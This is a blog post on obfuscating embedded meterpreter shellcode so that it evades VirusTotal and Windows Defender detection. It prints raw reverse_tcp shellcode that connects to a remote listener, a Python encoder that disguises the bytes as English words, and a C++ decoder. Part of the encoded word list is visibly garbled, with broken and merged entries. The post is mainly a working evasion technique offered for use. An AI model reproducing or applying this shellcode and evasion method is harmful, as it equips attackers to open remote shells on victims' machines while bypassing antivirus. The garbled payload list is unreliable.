---
layout: post
title:  "Embedded Shellcode Obfuscation Part 2"
date:   2023-09-17 00:00:00 +0000
categories: malware
---

A continuation of the previous chapter. We'll continue to attempt more obfuscation techniques with the same objective of bypassing VirusTotal. 

Because it seemed to play a part in detection - all code below will be compiled with the command `g++ .\main.cpp -o main.exe --std=c++20 -s`. The added `-s` flag removes all symbol table and relocation information.

We left off on version `main6.cpp`, now compiled to `main6_stripped.exe`. As of said version, the malware has the following features.
+ Dynamic loading of WinAPIs - `VirtualAlloc`, `CreateThread`, `WaitForSingleObject`.
+ Obfuscated strings of abovementioned WinAPIs with FLOSS bypass.
+ XOR decoding of meterpreter shellcode.
+ Execution of meterpreter shellcode in local process.

<br>
As of 17 Sep 2023, 4/71 vendors flag the current version on VirusTotal. Interesting to note that stripping the binary (-s) had led to different detection and classification results.

SHA256: [899db787a234bcaf90ae381fd034c6b119a5f5f96b54c5a507a548397ea404b9](https://www.virustotal.com/gui/file/899db787a234bcaf90ae381fd034c6b119a5f5f96b54c5a507a548397ea404b9)

![vt_stripped](/assets/post_assets/embedded-shellcode-obfuscation/vt_stripped.png)

<br>
It was getting tough trying to find ways to bypass detection. I'm unsure of what characteristics or signatures were flagged. To throw a wild guess, perhaps traits like filesize, entropy, length of encrypted bytes were used. Also, I didn't want to pack the binary - that would be too simple.

To note of current progress, Windows Defender does not detect `main6_stripped.exe` while on the filesystem. But is flagged when executed.

![windef](/assets/post_assets/embedded-shellcode-obfuscation/windef.png)

<br>
### 1. English Encoding
By iteratively throwing parts of the malware into VirusTotal, I narrowed down the detection to the payload itself. In part 1, we discussed the use of XOR payload encoding. Let's try something else. 

Introducing - English Encoding™ - to encode the shellcode into a list of English words. I'll describe the algorithm as such,
+ List of English words are generated.
+ For each word, calculate, sum(letters) % 0x100. If the sum matches the shellcode BYTE, save the word to `payload_words`.
+ Decode the shellcode given the 

Below is the encoder in python. I have reverted to the default meterpreter payload (windows/meterpreter/reverse_tcp LHOST=10.0.0.128 LPORT=443 -f c).

{% highlight python %}
# pip install english-words

from english_words import get_english_words_set
SHELLCODE = "\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x01\xd3\x50\x8b\x48\x18\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\x00\x00\x80\x68\x02\x00\x01\xbb\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"

wordlist = get_english_words_set(['web2'], lower=True)
shellcode_intarray = [ord(byte) for byte in SHELLCODE]
payload_words = []

for num in shellcode_intarray:
    for word in wordlist:
        value = 0
        for char in word:
            value += ord(char)
        if value % 0x100 == num:
            payload_words.append(word)
            break

print('char* payload_words[] {"' + '", "'.join(payload_words) + '"};')

# OUTPUT
# char* payload_words[] {"mounted", "priapic", "pricklyback", "ouphish", "ouphish", "ouphish", "schoppen", "mackintosh", "detroiter", "rarish", "sarcoid", "cornuted", "palaeogeographic", "protoheresiarch", "smush", "palaeogeographic", "protoheresiarch", "cinnamonwood", "palaeogeographic", "protoheresiarch", "pendecagon", "mackintosh", "antinarcotic", "iridescently", "odontoplast", "sweatproof", "overglance", "palaeogeographic", "bennettitales", "conalbumin", "mackintosh", "patesiate", "shockable", "ericophyte", "mycogone", "trachinidae", "reawakenment", "aotus", "velte", "noncommunication", "reinstate", "sequestrectomy", "strepen", "fluviatic", "pomiferous", "homotype", "duchess", "protoheresiarch", "palaeogeographic", "protoheresiarch", "fatbrained", "ranunculaceae", "palaeogeographic", "nowanights", "ericophyte", "strepen", "footlight", "palaeogeographic", "plasmosome", "premourn", "idoism", "patesiate", "bedkey", "occamism", "strepen", "footlight", "palaeogeographic", "balantidiasis", "velte", "strepen", "towy", "superficialness", "palaeogeographic", "unavowably", "spectacled", "idoism", "unseaworthy", "bedkey", "ericophyte", "mackintosh", "antinarcotic", "pomiferous", "palaeogeographic", "backtack", "palaeogeographic", "strepen", "anhinga", "mackintosh", "patesiate", "noncommunication", "reinstate", "sequestrectomy", "shockable", "strepen", "fluviatic", "retinerved", "hemiparasitism", "homotype", "kyphoscoliotic", "sceneshifter", "hickey", "unattainable", "devotement", "hickey", "robotization", "homotype", "hemiparasitism", "balantidiasis", "palaeogeographic", "balantidiasis", "robotization", "strepen", "towy", "shirtman", "palaeogeographic", "cinnamonwood", "pir", "palaeogeographic", "balantidiasis", "binucleate", "strepen", "towy", "palaeogeographic", "superexpansion", "palaeogeographic", "strepen", "footlight", "rarish", "misventurous", "robotization", "robotization", "bradbury", "bradbury", "mycogone", "theodicy", "ringtail", "tagalize", "antinarcotic", "hemiparasitism", "balantidiasis", "coryphylly", "ringtail", "palaeogeographic", "mugwump", "unalterability", "warmed", "antinarcotic", "antinarcotic", "antinarcotic", "desensitization", "isoteles", "heptameron", "cloisteral", "ouphish", "ouphish", "isoteles", "noncollection", "picard", "cloisteral", "coryphylly", "stereotype", "isoteles", "occamism", "noncollection", "overglance", "dryfoot", "rarish", "priapic", "antinarcotic", "footlight", "fissiparous", "artgum", "strepen", "ouphish", "ouphish", "lineograph", "sphenocephalia", "stereotype", "superficialness", "isoteles", "lineograph", "warmed", "tidology", "ouphish", "antinarcotic", "rd", "robotization", "iridescently", "idoism", "ergothioneine", "antinarcotic", "ant, "pataca", "superexpansion", "acquaint", "ranunculaceae", "isoteles", "reawakenment", "unheroize", "leucaurin", "coryphylly", "antinarcoinarcotic", "antinarcotic", "unalterability", "amid", "antinarcotic", "antinarcotic, "palaeogeographic", "redisperse", "pataca", "plasmosome", "isoteles", "ouphish", "fatbrained", "ouphish", "ouphish", "acquaint", "patac", "antinarcotic", "strepen", "carvoepra", "lineograph", "basisphenoidal", "homotypantinarcotic", "regalia", "deplethoric", "prepared", "pataca", "ouphish", "acquaint", "prepared", "ranunculaceae", "isoteles", "reawakenme", "noncommunication", "carvoepra", "alismales", "heartbreaker", "cabriolet", "upred", "unattainable", "ouphish", "hickey", "conalbumin", "balantidiasis", "isoteles", "ouphish", "plasmosome", "ouphish", "ouphish", "pataoom", "acquaint", "pataca", "ouphish", "prepared", "antinarcotic", "regalia"}; 

{% endhighlight %}

<br>
Similarly, in C++, we decode the payload.

{% highlight cpp %}
char* payload_words[] {...}
int SHELLCODE_LENGTH = sizeof(payload_words) / 4;
char payload[254];

void decode_payload() {
    for (int i {0}; i < SHELLCODE_LENGTH; i++) {
        int j = 0;
        int value = 0;
        while (payload_words[i][j] != '\0') {
            value += (int) payload_words[i][j];
            j++;
        }
        value = value % 0x100;
        payload[i] = value;
    }
}
{% endhighlight %}